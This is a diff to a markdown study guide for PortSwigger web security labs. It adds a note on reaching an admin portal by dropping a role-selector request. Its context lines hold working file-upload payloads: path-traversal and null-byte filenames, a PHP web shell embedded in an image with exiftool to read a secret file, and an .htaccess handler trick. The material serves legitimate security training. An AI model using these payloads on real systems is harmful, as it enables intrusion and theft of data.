@@ -816,6 +816,12 @@ Connection: close
 
 [PortSwigger Lab: User role can be modified in user profile](https://portswigger.net/web-security/access-control/lab-user-role-can-be-modified-in-user-profile)  
 
+>Escalation to administrator is sometimes controlled by a role selector GET request, by **dropping** this GET request before it is presented to the user, the default role of admin is selected and access granted to the admin portal.  
+
+![Select a role](images\select-a-role.png)  
+
+[PortSwigger Lab: Authentication bypass via flawed state machine](https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-authentication-bypass-via-flawed-state-machine)  
+  
 ## CSRF Account Takeover  
 
 >Cross-Site Request Forgery vulnerability allows an attacker to force users to perform actions that they did not intend to perform. This can enable attacker to change victim email address and use password reset to take over the account.  
@@ -1654,7 +1660,7 @@ GET /admin_controls/metrics/admin-image?imagefile=%252e%252e%252f%252e%252e%252f
   
 1. Upload the file name and include obfuscated path traversal ```..%2fexploit.php``` and retrieve the content ```GET /files/avatars/..%2fexploit.php```  
 2. Upload a file named, ```exploit.php%00.jpg``` with trailing null character and get the file execution at ```/files/avatars/exploit.php```  
-3. Create polygot using valid image file, using the command: ```exiftool -Comment="<?php echo 'START ' . file_get_contents('/home/carlos/secret') . ' END'; ?>" ./stickman.png -o polyglot2023.php```. To view the extracted data, issue Get request to ```/files/avatars/polyglot.php``` , and search the response content for the phrase ```START``` to obtain exfiltrated sensitive data.  
+3. Create polygot using valid image file, and running the command: ```exiftool -Comment="<?php echo 'START ' . file_get_contents('/home/carlos/secret') . ' END'; ?>" ./stickman.png -o polyglot2023.php```. To view the extracted data, issue Get request to ```/files/avatars/polyglot.php``` , and search the response content for the phrase ```START``` to obtain exfiltrated sensitive data.  
 4. Upload two files, first ***.htaccess*** with content ```AddType application/x-httpd-php .l33t``` allowing then the upload and execute of second file named, ```exploit.l33t```  
   
 ![File upload stages](images/file-upload-stages.png)  
